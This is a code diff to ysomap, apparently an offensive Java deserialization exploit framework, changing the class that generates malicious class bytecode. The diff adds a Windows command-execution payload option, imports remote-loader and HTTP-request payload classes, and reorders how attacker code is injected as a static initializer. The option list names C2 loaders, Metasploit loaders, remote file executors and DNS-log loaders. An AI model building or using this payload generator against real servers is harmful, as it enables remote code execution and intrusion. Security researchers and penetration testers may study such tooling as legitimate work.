@@ -2,10 +2,13 @@ package ysomap.bullets.objects;
 
 import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
-import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import loader.*;
+import secret.HTTPRequester;
+import secret.RemoteFileHttpLoader1;
+import secret.SpecialCommandForWinExecutor;
+import secret.SpecialRuntimeExecutor;
 import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.jdk.TemplatesImplBullet;
 import ysomap.common.annotation.*;
@@ -41,11 +44,11 @@ public class ClassWithExistEviClass extends AbstractBullet<byte[]> {
 
     @NotNull
     @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
-    public String type = null;
+    public String type = "class";
 
     @NotNull
     @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
-            "可选default、SpecialRuntimeExecutor、" +
+            "可选default、SpecialRuntimeExecutor、SpecialCommandForWinExecutor、" +
             "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
             "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、CustomizableClassLoader")
     private String effect = "default";
@@ -70,18 +73,19 @@ public class ClassWithExistEviClass extends AbstractBullet<byte[]> {
                 classname = effectClazz.getSimpleName() + System.currentTimeMillis();
             }
             code = process((String) objs[1], (String) objs[2], exception, body);
-            pool.appendClassPath(new ClassClassPath(effectClazz));
-            cc = pool.getCtClass(effectClazz.getName());
+            cc = ClassFiles.makeClassFromExistClass(pool, effectClazz, null);
             cc.setName(classname);
         }
 
         if(cc != null){
-            if(code != null){
-                ClassFiles.insertStaticBlock(cc, code);
-            }
             if(superClass != null){
                 ClassFiles.insertSuperClass(pool, cc, superClass);
             }
+
+            if(code != null){
+                ClassFiles.insertStaticBlock(cc, code);
+            }
+
             return ClassFiles.getClassBytecode(cc);
         }else{
             return new byte[0];
